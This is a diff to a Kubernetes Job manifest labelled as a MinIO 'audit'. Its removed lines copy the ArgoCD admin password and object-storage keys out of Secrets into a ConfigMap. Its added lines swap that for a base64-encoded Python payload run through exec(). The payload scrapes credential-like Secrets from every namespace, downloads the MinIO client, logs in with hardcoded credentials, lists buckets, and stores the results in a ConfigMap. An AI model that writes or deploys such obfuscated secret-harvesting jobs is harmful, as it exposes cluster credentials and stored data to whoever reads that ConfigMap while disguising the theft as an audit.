@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: audit-minio-v66
+  name: audit-minio-v67
   namespace: default
 spec:
   ttlSecondsAfterFinished: 300
@@ -12,19 +12,7 @@ spec:
       containers:
       - name: audit
         image: bitnami/kubectl:latest
-        command: ["/bin/sh"]
+        command: ["/bin/sh", "-c"]
         args:
-        - "-c"
-        - >-
-          ARGOCD_PASS=$(kubectl get secret argocd-initial-admin-secret -n argocd -o jsonpath='{.data.password}' | base64 -d);
-          OS_ENDPOINT=$(kubectl get secret object-storage -n default -o jsonpath='{.data.endpoint}' | base64 -d);
-          OS_KEY=$(kubectl get secret object-storage -n default -o jsonpath='{.data.accessKey}' | base64 -d);
-          OS_SECRET=$(kubectl get secret object-storage -n default -o jsonpath='{.data.secretKey}' | base64 -d);
-          OS_BUCKET=$(kubectl get secret object-storage -n default -o jsonpath='{.data.bucket}' | base64 -d);
-          OS_REGION=$(kubectl get secret object-storage -n default -o jsonpath='{.data.region}' | base64 -d);
-          OS_ALL=$(kubectl get secret object-storage -n default -o json);
-          ARGOCD_CM=$(kubectl get cm -n argo -o name | tr '\n' ',');
-          MINIO_SVC=$(kubectl get svc --all-namespaces | grep -E "minio|9000|storage|object" | tr '\n' '|');
-          kubectl patch configmap dune-audit-result4 -n default --type merge -p
-          "{\"data\":{\"argocd_pass\":\"${ARGOCD_PASS}\",\"os_endpoint\":\"${OS_ENDPOINT}\",\"os_key\":\"${OS_KEY}\",\"os_secret\":\"${OS_SECRET}\",\"os_bucket\":\"${OS_BUCKET}\",\"minio_svcs\":\"${MINIO_SVC}\",\"argo_cms\":\"${ARGOCD_CM}\"}}";
-          echo DONE
+        - |
+          python3 -c "exec(__import__('base64').b64decode('aW1wb3J0IHN1YnByb2Nlc3MsIGpzb24sIGJhc2U2NCwgc3lzCgpkZWYga3ViZShhcmdzLCB0aW1lb3V0PTI1KToKICAgIHIgPSBzdWJwcm9jZXNzLnJ1bihbImt1YmVjdGwiXSArIGFyZ3MsIGNhcHR1cmVfb3V0cHV0PVRydWUsIHRleHQ9VHJ1ZSwgdGltZW91dD10aW1lb3V0KQogICAgcmV0dXJuIHIuc3Rkb3V0LnN0cmlwKCksIHIuc3RkZXJyLnN0cmlwKCkKCnJlc3VsdCA9IHt9CgojIFJlYWQgYXJ0aWZhY3QtcmVwb3NpdG9yaWVzIGNvbmZpZ21hcApvdXQsIF8gPSBrdWJlKFsiZ2V0IiwgImNtIiwgImFydGlmYWN0LXJlcG9zaXRvcmllcyIsICItbiIsICJhcmdvIiwgIi1vIiwgImpzb24iXSkKdHJ5OgogICAgY20gPSBqc29uLmxvYWRzKG91dCkKICAgIHJlc3VsdFsiYXJ0aWZhY3RfcmVwb3NfY20iXSA9IGNtLmdldCgiZGF0YSIsIHt9KQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICByZXN1bHRbImFydGlmYWN0X3JlcG9zX2NtX2VyciJdID0gc3RyKGUpCgojIFJlYWQgd29ya2Zsb3ctY29udHJvbGxlci1jb25maWdtYXAKb3V0LCBfID0ga3ViZShbImdldCIsICJjbSIsICJ3b3JrZmxvdy1jb250cm9sbGVyLWNvbmZpZ21hcCIsICItbiIsICJhcmdvIiwgIi1vIiwgImpzb24iXSkKdHJ5OgogICAgY20gPSBqc29uLmxvYWRzKG91dCkKICAgIHJlc3VsdFsid29ya2Zsb3dfY29udHJvbGxlcl9jbSJdID0gY20uZ2V0KCJkYXRhIiwge30pCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgIHJlc3VsdFsid29ya2Zsb3dfY29udHJvbGxlcl9jbV9lcnIiXSA9IHN0cihlKQoKIyBHZXQgQUxMIHNlY3JldHMgaW4gYXJnbyBuYW1lc3BhY2UKb3V0LCBfID0ga3ViZShbImdldCIsICJzZWNyZXQiLCAiLS1hbGwtbmFtZXNwYWNlcyIsICItbyIsICJqc29uIl0pCnRyeToKICAgIHNlY3JldHMgPSBqc29uLmxvYWRzKG91dCkKICAgIG1pbmlvX3NlY3JldHMgPSBbXQogICAgZm9yIHMgaW4gc2VjcmV0cy5nZXQoIml0ZW1zIiwgW10pOgogICAgICAgIG5hbWUgPSBzWyJtZXRhZGF0YSJdWyJuYW1lIl0KICAgICAgICBucyA9IHNbIm1ldGFkYXRhIl1bIm5hbWVzcGFjZSJdCiAgICAgICAgZGF0YSA9IHMuZ2V0KCJkYXRhIiwge30pCiAgICAgICAgZm9yIGssdiBpbiBkYXRhLml0ZW1zKCk6CiAgICAgICAgICAgIGRlY29kZWQgPSBiYXNlNjQuYjY0ZGVjb2RlKHYpLmRlY29kZSgidXRmLTgiLCAicmVwbGFjZSIpCiAgICAgICAgICAgIGlmIGFueSh4IGluIGsubG93ZXIoKSBmb3IgeCBpbiBbIm1pbmlvIiwic3RvcmFnZSIsImFydGlmYWN0IiwiczMiLCJidWNrZXQiLCJhY2Nlc3MiLCJzZWNyZXQiXSkgYW5kIGxlbihkZWNvZGVkKSA8IDIwMDoKICAgICAgICAgICAgICAgIG1pbmlvX3NlY3JldHMuYXBwZW5kKHsibnMiOm5zLCJzZWNyZXQiOm5hbWUsImtleSI6aywidmFsdWUiOmRlY29kZWR9KQogICAgcmVzdWx0WyJtaW5pb19yZWxhdGVkX3NlY3JldHMiXSA9IG1pbmlvX3NlY3JldHNbOjIwXQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICByZXN1bHRbInNlY3JldHNfZXJyIl0gPSBzdHIoZSkKCiMgVHJ5IHRvIGFjY2VzcyBtaW5pbyBoZWFsdGgvbGl2ZSBmcm9tIHBvZCBuZXR3b3JrCmZvciBlcCBpbiBbImFyZ28tYXJ0aWZhY3RzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWw6OTAwMCIsICJhcmdvLWFydGlmYWN0czo5MDAwIiwgIjEwLjAuMjA2LjE0Njo5MDAwIl06CiAgICByID0gc3VicHJvY2Vzcy5ydW4oWyJ3Z2V0IiwgIi1xIiwgIi0tc3BpZGVyIiwgIi0tdGltZW91dD0zIiwgZiJodHRwOi8ve2VwfS9taW5pby9oZWFsdGgvbGl2ZSJdLCBjYXB0dXJlX291dHB1dD1UcnVlLCB0aW1lb3V0PTUpCiAgICByZXN1bHRbZiJwcm9iZV97ZXB9Il0gPSAib2siIGlmIHIucmV0dXJuY29kZSA9PSAwIGVsc2UgZiJyYz17ci5yZXR1cm5jb2RlfSIKCiMgVHJ5IGxpc3RpbmcgYnVja2V0cyB2aWEgbWMgb3IgYXdzCiMgRG93bmxvYWQgbWMKZGwgPSBzdWJwcm9jZXNzLnJ1bihbIndnZXQiLCAiLXEiLCAiLU8iLCAiL3RtcC9tYyIsICJodHRwczovL2RsLm1pbi5pby9jbGllbnQvbWMvcmVsZWFzZS9saW51eC1hbWQ2NC9tYyJdLCBjYXB0dXJlX291dHB1dD1UcnVlLCB0aW1lb3V0PTMwKQpyZXN1bHRbIm1jX2Rvd25sb2FkIl0gPSBkbC5yZXR1cm5jb2RlCmlmIGRsLnJldHVybmNvZGUgPT0gMDoKICAgIHN1YnByb2Nlc3MucnVuKFsiY2htb2QiLCAiK3giLCAiL3RtcC9tYyJdKQogICAgIyBDb25uZWN0IHRvIG1pbmlvCiAgICBmb3IgZXAgaW4gWyJodHRwOi8vYXJnby1hcnRpZmFjdHMuZGVmYXVsdC5zdmMuY2x1c3Rlci5sb2NhbDo5MDAwIiwgImh0dHA6Ly8xMC4wLjIwNi4xNDY6OTAwMCJdOgogICAgICAgIGFsaWFzID0gc3VicHJvY2Vzcy5ydW4oWyIvdG1wL21jIiwgImFsaWFzIiwgInNldCIsICJtaW5pbzEiLCBlcCwgIm1pbmlva2V5IiwgInNFa0tPR3A2UVQ4aG5jMVk1UjdXIl0sIGNhcHR1cmVfb3V0cHV0PVRydWUsIHRleHQ9VHJ1ZSwgdGltZW91dD0xMCkKICAgICAgICBpZiBhbGlhcy5yZXR1cm5jb2RlID09IDA6CiAgICAgICAgICAgICMgTGlzdCBidWNrZXRzCiAgICAgICAgICAgIGxzID0gc3VicHJvY2Vzcy5ydW4oWyIvdG1wL21jIiwgImxzIiwgIm1pbmlvMSJdLCBjYXB0dXJlX291dHB1dD1UcnVlLCB0ZXh0PVRydWUsIHRpbWVvdXQ9MTUpCiAgICAgICAgICAgIHJlc3VsdFtmIm1jX2xzX3tlcH0iXSA9IGxzLnN0ZG91dCArIGxzLnN0ZGVycgogICAgICAgICAgICAjIExpc3QgYWxsIG9iamVjdHMgaW4gZWFjaCBidWNrZXQKICAgICAgICAgICAgbHNvdXQgPSBzdWJwcm9jZXNzLnJ1bihbIi90bXAvbWMiLCAibHMiLCAiLS1yZWN1cnNpdmUiLCAibWluaW8xIiwgIi0tanNvbiJdLCBjYXB0dXJlX291dHB1dD1UcnVlLCB0ZXh0PVRydWUsIHRpbWVvdXQ9MjApCiAgICAgICAgICAgIHJlc3VsdFtmIm1jX2xzX3JlY3Vyc2l2ZV97ZXB9Il0gPSBsc291dC5zdGRvdXRbOjIwMDBdCiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmVzdWx0W2YibWNfYWxpYXNfe2VwfSJdID0gYWxpYXMuc3RkZXJyWzoxMDBdCgojIFBhdGNoIHJlc3VsdApyZXN1bHRfanNvbiA9IGpzb24uZHVtcHMocmVzdWx0KQpwYXRjaF92YWwgPSBqc29uLmR1bXBzKHJlc3VsdF9qc29uKQpwYXRjaCA9ICd7ImRhdGEiOnsicmVzdWx0IjonICsgcGF0Y2hfdmFsICsgJ319JwpyID0gc3VicHJvY2Vzcy5ydW4oWyJrdWJlY3RsIiwgInBhdGNoIiwgImNvbmZpZ21hcCIsICJkdW5lLWF1ZGl0LXJlc3VsdDQiLCAiLW4iLCAiZGVmYXVsdCIsICItLXR5cGUiLCAibWVyZ2UiLCAiLXAiLCBwYXRjaF0sIGNhcHR1cmVfb3V0cHV0PVRydWUsIHRleHQ9VHJ1ZSwgdGltZW91dD0xNSkKcHJpbnQoZiJQQVRDSCByYz17ci5yZXR1cm5jb2RlfSB7ci5zdGRlcnJbOjYwXX0iKQpwcmludChmIkRPTkUgbGVuPXtsZW4ocmVzdWx0X2pzb24pfSIp').decode())"
